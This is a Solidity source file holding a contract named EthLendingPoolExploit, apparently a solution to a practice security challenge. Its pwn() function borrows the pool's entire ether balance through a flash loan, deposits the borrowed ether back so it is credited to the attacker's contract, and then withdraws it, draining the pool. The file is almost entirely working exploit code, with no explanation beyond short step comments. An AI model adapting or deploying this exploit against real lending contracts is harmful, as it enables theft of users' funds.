// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IEthLendingPool {
    function balances(address) external view returns (uint);

    function deposit() external payable;

    function withdraw(uint _amount) external;

    function flashLoan(
        uint amount,
        address target,
        bytes calldata data
    ) external;
}

contract EthLendingPoolExploit {
    IEthLendingPool public pool;

    constructor(address _pool) {
        pool = IEthLendingPool(_pool);
    }
    
    receive() external payable {}
    
    function deposit() external payable {
        pool.deposit{value: msg.value}();
    }

    function pwn() external {
        // this function will be called
        uint bal = address(pool).balance;
        // 1. call flash loan
        pool.flashLoan(bal, address(this), abi.encodeWithSignature("deposit()"));
        // 3. withdraw
        pool.withdraw(pool.balances(address(this)));        
    }
}

